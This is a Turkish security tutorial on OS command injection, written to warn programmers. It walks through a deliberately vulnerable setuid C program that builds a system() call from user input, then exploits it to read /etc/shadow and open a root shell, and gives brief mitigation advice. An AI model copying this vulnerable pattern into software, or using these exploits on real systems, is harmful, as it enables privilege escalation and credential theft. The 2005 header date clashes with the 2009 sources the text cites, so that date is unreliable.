---[ OS Command Injection Vulnerabilities [23/03/2005]
---[ murderkey <murderkey[n0_sp4m]gmail[zot]com
---[ Hellcode Research Lab | The Computer Cheats
---[ http://tcc.hellcode.net | hellcode.net



Geçtiğimiz günlerde, Amerikan Ulusal Güvenlik Teşkilatı (NSA) çeşitli güvenlik firmalarıyla 
ortaklaşa yaptığı bir araştırmanın istatistiksel sonuçlarını duyurdu. Araştırmada programcılardan 
kaynaklanan en tehlikeli 25 hata yer aldı. "İşletim Sistemleri Komut Enjeksiyonu" zayıflığı bu 
listenin 5. sırasında ve risk seviyesi yüksek olarak işaretlenmiş. Bu yazıda, söz konusu zayıflığın 
nasıl oluştuğu ve engellenmesi için neler yapılması gerektiği anlatılacaktır.

Nedir ve Nasıl Çalışır ?
Zaman zaman yazılımlarda, çeşitli fonksiyonları yerine getirmek için harici bir yazılım (komut/modül) 
çağırmak gerekebiliyor.Örnek olarak Linux, Solaris, BSD, Plan9 gibi sistemler üzerinde ki watch, time 
vb. komutlar verilebilir.Söz konusu hatanın kurbanı olmak, hemen her programlama dilinde (JAVA,Assembly,
 C/C++ vb...) ve hemen her işletim sisteminde mümkün ve bu zayıflık sayesinde lokal bir kullanıcı, 
yetkisini en üst düzeye yükseltebilir veya komutlar çalıştırabilir. 

Öncelikle senaryo şu olsun, yazdığınız bir yazılım "root" yetkisiyle sisteme kurulmuş,  ve yazdığınız 
yazılımın çeşitli fonksiyonları yerine getiren alt yazılımları/moduler var ana programınızda Linux'ta 
hazır bulunan ve belirtilen yazılımın işlem hızını gösteren "time" komutunu kullanarak ana programınızdan 
alt programların işlem hızını göstermek istiyorsunuz.Aşağıda ki, söz konusu zayıflığı barındıran kodu 
bunu yapan kod parçası olarak düşünün.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	char komut[256];
if(argc<2)
{
	printf("Hata: islem hizini ogrenmek istediginiz programi girin!\n");
}
memset(&komut,0,sizeof(komut));
strcat(komut, "time ./");
strcat(komut,argv[1]);
system(komut);
return 0;
}

Hatayı barındıran kodumuzu derliyoruz ve programımızın haklarını değiştiriyoruz, senaryomuza göre, 
varsayalım ki programımız "root" haklarıyla yani en üst düzey kullanıcı haklarıyla çalışıyor.

murderkey@labs:~$ cc vuln.c -o vuln
root@lab:~# chown root.root vuln
root@lab:~# chmod +s vuln
root@lab:~# exit
murderkey@labs:~$

Yukarda ne yaptık? Öncelikle programımızı derledik hemen ardından kullanıcı sahibini değiştirdik ve onun 
ardından da "+s" parametresi ile program calıştığı sürece calışanın o haklara sahip olmasını sağladık. Devam 
edelim ve  programımızı çalıştıralım, bakalım istediğimiz gerçekleşiyor mu? Ondan önce, ben ekrana basitçe 
"Merhaba Dünya" mesajini basan bir kod yazdım ve derledim amacim bu programın işlem hızını ögrenmek.

murderkey@lab:~$ ./vuln helloworld
Merhaba dunya
real 0m0.002s
user 0m0.000s
sys  0m0.000s
murderkey@lab:~$

Bir programcı klasiği olan merhaba dünya adlı ufak bir yazılım yazdık ve vuln adlı yazılımımızı hatırlıyorsanız 
parametre olarak girilen yazılımların çalışma hızını gösteriyordu, bizde parametre olarak Merhaba Dünya yazan 
programımızın çalışma hızını öğrenmek istedik.Buraya kadar yazılımımız sorunsuz çalıştı görünürde hiçbirşey yok. 
Kodumuz bu haliyle gayet masum görünüyor fakat programa verilen girdilerde daha farklı davranan bir kullanıcı, 
programında farklı davranmasına sebep olacaktır.

Biz burada helloworld adlı kod yerine başka birşey calıştırsak ne olurdu? Örneğin, cat /etc/shadow adlı komutu 
çalıştıran veya bize yeni bir shell (kabuk) açan ufak bir kod yazsak ne olur ? Görmek için devam edelim ve C dilinde 
belirtilen komutları işleyen bir kod yazalım.



main(void)
{
system("cat /etc/shadow");
return 0;
}


murderkey@lab:~$ cc exp1.c -o exp1
murderkey@lab:~$ ./vuln exp1 
... 
sync:*:14062:0:99999:7:::
games:*:14062:0:99999:7:::
man:*:14062:0:99999:7:::
lp:*:14062:0:99999:7:::
mail:*:14062:0:99999:7:::
news:*:14062:0:99999:7:::
uucp:*:14062:0:99999:7:::
...
real 0m0.003s
user 0m0.000s
sys  0m0.000s

murderkey@lab:~$


Aklımıza gelen fikir kusursuz işe yaradı. Normal şartlar altında sistemde ki kullanıcıların (user) kullandığı 
şifreleri ancak "root" yetkisine sahipseniz görebilirsiniz (istisnalar hariç tabii) ama hatırlayın zayıflığa 
sahip programımız üzerinden bir kod çalıştırdık ve zayıflığa sahip yazılım root yetkileriyle çalışıyor bundan 
dolayı normal kullanıcı yetkilerine sahip bir kodu root yetkisiyle çalıştırmayı başardık.

Şimdi biraz daha ileri gidelim ve root yetkilerine sahip bir shell açmaya çalışarak sistemde ki erişim seviyemizi 
en üst düzeye çekmeye çalışalım, aynı şekilde "cat /etc/shadow" komutunu çalıştıran kodumuzun tek satırını 
değiştirerek derliyoruz.

main(void)
{
system("/bin/sh");
return 0;
}

murderkey@lab:~$ cc exp2.c -o exp2
murderkey@lab:~$ ./vuln exp2
real 0m0.002
user 0m0.000
sys  0m0.000

root@lab:~# id
uid=0(root) gid=0(root) groups=0(root)

Sonuç:


Görüldüğü gibi tek satırı değiştirerek programımızdaki zayıflık sayesinde  sistemde en üst düzey kullanıcı yetkisi 
yani "root" yetkisine ulaştık.Sanırım NSA yaptığı araştırmada sistemlere zarar veren en tehlikeli 25 açık arasında 
5. sıraya yazımızın konusu olan Komut Enjeksiyonu hatasını koymakla hata yapmamış.Çok basit ve gözden kaçması kolay 
olan fakat risk seviyesi oldukça yüksek bir hata, çeşitli filtrelemelerle veya kullanıcı haklarının iyi ayarlanması 
(gerekli fonksiyolar kullanilarak) söz konusu sorun basitçe aşılabilir.Benim amacım, bu yazıda durumun ciddiyetini 
programcılara göstermek fakat talebe bağlı olarak çeşitli yazılım açıklarının (Buffer Overflow, Format String vs) nasıl 
engellenebileceğine dair ufak bir yazı yazılabilir. Umarım bu yazı konunun ciddiyeti hakkında kafanızda bir şeylerin 
oluşmasına yardımcı olmuştur.Yazıda herhangi bir hata veya atladığım nokta olduğunu düşünüyorsanız iletişime geçerek 
yardımcı olabilirsiniz ve tabii bunun için üzgünüm.





Referans:


[1] CWE/SANS TOP 25 Most Dangerous Programming Errors http://www.sans.org/top25errors

[2] Phrack #59: Runtime Process infection http://www.phrack.org/issues.html?issue=59&id=8#article

[3] Least Privilege http://www.hellcode.net/ppe.txt

[4] FreeBSD Telnet Daemon Zero-Day (Yazının yazılmasından bir gün sonra) http://blog.lifeoverip.net/2009/02/15/freebsd-telnet-daemon-zero-day-acikligi/